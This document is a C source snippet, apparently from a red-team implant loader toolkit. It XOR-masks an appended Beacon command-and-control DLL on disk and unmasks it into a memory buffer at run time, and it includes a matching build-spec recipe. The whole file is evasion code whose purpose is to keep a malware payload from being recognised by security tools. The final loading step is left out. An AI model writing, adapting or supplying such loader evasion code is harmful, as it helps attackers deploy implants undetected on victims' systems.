/*
 * Resource Masking — XOR the appended Beacon DLL at rest
 *
 * The loader PIC is protected by link-time transforms, but the
 * appended Beacon DLL remains a recognisable PE. Resource masking
 * XORs the DLL bytes on disk and unmasks them into a temporary
 * RW buffer immediately before parsing.
 *
 * Spec file counterpart:
 *   generate $KEY 128
 *   xor $DLL $KEY
 *   push $DLL
 *   push $KEY
 *   link "dll"
 *   link "mask"
 */

#include <windows.h>

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

char _DLL_ [0]  __attribute__((section("dll")));
char _MASK_[0]  __attribute__((section("mask")));

#define GETRESOURCE(x) ((char*)&x)

typedef struct { int len; char value[]; } RESOURCE;

void go() {
    RESOURCE *masked_dll = (RESOURCE *)GETRESOURCE(_DLL_);
    RESOURCE *mask_key   = (RESOURCE *)GETRESOURCE(_MASK_);

    /* temporary RW buffer for the unmasked DLL */
    char *dll_src = KERNEL32$VirtualAlloc(NULL, masked_dll->len,
        MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);

    for (int i = 0; i < masked_dll->len; i++) {
        dll_src[i] = masked_dll->value[i] ^ mask_key->value[i % mask_key->len];
    }

    /* parse and load as before, then free the temporary buffer */
    KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
}
